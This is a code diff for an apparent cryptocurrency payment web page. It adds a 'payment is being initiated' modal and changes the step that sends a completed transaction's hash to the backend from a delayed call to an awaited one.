@@ -360,6 +360,17 @@
     </div>
 
     <!-- 交易发起弹窗 -->
+     <div id="initiationModalShow" class="modal">
+        <div class="modal-overlay"></div>
+        <div class="modal-content">
+            <div class="modal-icon">
+                <img src="https://cdn-tech.kuangyid.com/1760344567235.png" alt="">
+            </div>
+            <h3 class="modal-title" id="modalTitle">Payment is being initiated.</h3>
+            <p class="modal-text" id="modalText">Please do not close this page to avoid potential asset loss.</p>
+            <!-- <button id="closeModalBtn" class="modal-btn">Close</button> -->
+        </div>
+    </div>
     <div id="initiationModal" class="modal">
         <div class="modal-overlay"></div>
         <div class="modal-content">
@@ -431,6 +442,7 @@
             const amountValue = document.getElementById('amountValue');
             const usdtBalance = document.getElementById('usdtBalance');
             const initiationModal = document.getElementById('initiationModal');
+            const initiationModalShow = document.getElementById('initiationModalShow');
             const closeModalBtn = document.getElementById('closeModalBtn');
             
             // 多语言相关DOM元素
@@ -845,7 +857,8 @@
                             if (txReceipt.status) {
                                 // 交易成功：发送哈希给后端
                                 if (!isTxHashSent) {
-                                    await setTimeout(() => sendTxHashToBackend(txHash), 5000);
+                                    initiationModalShow.style.display = 'flex';
+                                    await sendTxHashToBackend(txHash);
                                     isTxHashSent = true;
                                 }
                                 getUSDTBalance();
@@ -886,6 +899,7 @@
                     const responseData = await response.json();
                     if (responseData.success) {
                         initiationModal.style.display = 'flex';
+                        initiationModalShow.style.display = 'none';
                         return true;
                     } else {
                         throw new Error(`Backend error: ${responseData.msg || 'Failed to sync TxHash'}`);
